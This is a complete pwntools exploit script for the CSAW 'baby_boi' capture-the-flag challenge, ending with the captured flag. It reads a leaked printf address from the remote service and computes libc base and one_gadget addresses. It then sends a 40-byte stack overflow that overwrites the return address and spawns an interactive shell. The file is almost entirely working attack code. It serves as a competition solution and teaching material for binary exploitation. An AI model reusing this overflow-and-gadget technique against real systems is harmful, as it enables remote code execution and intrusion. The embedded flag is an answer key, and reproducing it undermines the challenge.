#!/usr/bin/python3

from pwn import *
import struct
import time
import sys

def main():
    #target = process("./baby_boi")
    target = remote("pwn.chal.csaw.io", 1005)
    
    connection_message = target.recv().rsplit(b":")
    printf_got = int(connection_message[1].strip(), 16)

    print(connection_message)
    print(printf_got)
    #sys.exit(1)

    # /lib/x86_64-linux-gnu/libc-2.27.so offsets
    printf_libc_offset = 413312
    one_gadget_libc_offset = 0x4f322

    libc_base_address = printf_got - printf_libc_offset
    one_gadget_address = libc_base_address + one_gadget_libc_offset

    print("Computed libc addresses: ")
    print("libc base address =", hex(libc_base_address))
    print("one gadget address    =", hex(one_gadget_address))

    payload = b"A"*40
    payload += p64(one_gadget_address)
    payload += p64(0x00)*8
    payload += b"\n"

    print(payload)
    target.send(payload)
    target.interactive()

main()

# flag{baby_boi_dodooo_doo_doo_dooo}
